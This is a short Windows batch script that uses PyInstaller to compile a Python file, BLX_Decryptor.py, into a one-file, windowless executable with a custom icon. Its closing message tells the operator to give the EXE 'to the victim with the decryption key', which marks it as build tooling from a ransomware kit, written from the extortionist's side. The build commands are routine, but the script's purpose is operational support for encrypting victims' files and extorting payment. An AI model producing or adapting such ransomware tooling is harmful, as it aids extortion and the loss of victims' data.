@echo off
REM Build BLX_Decryptor.py to EXE (one file, no console window)
set SCRIPT_DIR=%~dp0
cd /d "%SCRIPT_DIR%"
python -m pip install pyinstaller cryptography --quiet 2>nul
python -m PyInstaller --onefile --windowed --name "BLX_Decryptor" --icon "..\Img\7752569.ico" --clean BLX_Decryptor.py
if exist "dist\BLX_Decryptor.exe" (
    echo.
    echo Build OK: dist\BLX_Decryptor.exe
    echo Give this EXE to the victim with the decryption key.
) else (
    echo Build failed.
)
pause
